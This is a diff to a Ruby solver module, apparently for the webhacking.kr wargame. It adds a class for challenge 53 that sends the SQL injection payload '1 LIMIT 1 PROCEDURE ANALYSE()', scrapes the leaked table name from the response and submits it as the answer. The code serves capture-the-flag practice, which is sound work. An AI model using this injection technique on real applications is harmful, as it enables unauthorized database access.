@@ -1301,6 +1301,33 @@ module WebhackingKR
   end
 
   ##
+  # Challenge 53
+  class Challenge53 < ChallengeBase
+    CHALLENGE = 53
+
+    PATH = '/challenge/web-28/'
+    PARAM_VAL = 'val'
+    PARAM_ANSWER = 'answer'
+    PAYLOAD = '1 LIMIT 1 PROCEDURE ANALYSE()'
+
+    def exec
+      query = URI.encode_www_form(PARAM_VAL => PAYLOAD)
+      log('Sending payload')
+      response = get("#{PATH}?#{query}")
+      unless response.body =~ /webhacking\.(\w+)\.a<hr>/
+        failed('Table name not found')
+        return
+      end
+
+      table_name = Regexp.last_match(1)
+      log("Table name found: #{table_name}")
+      query = URI.encode_www_form(PARAM_ANSWER => table_name)
+      response = get("#{PATH}?#{query}")
+      check(response.body)
+    end
+  end
+
+  ##
   # Challenge 54
   class Challenge54 < ChallengeBase
     CHALLENGE = 54
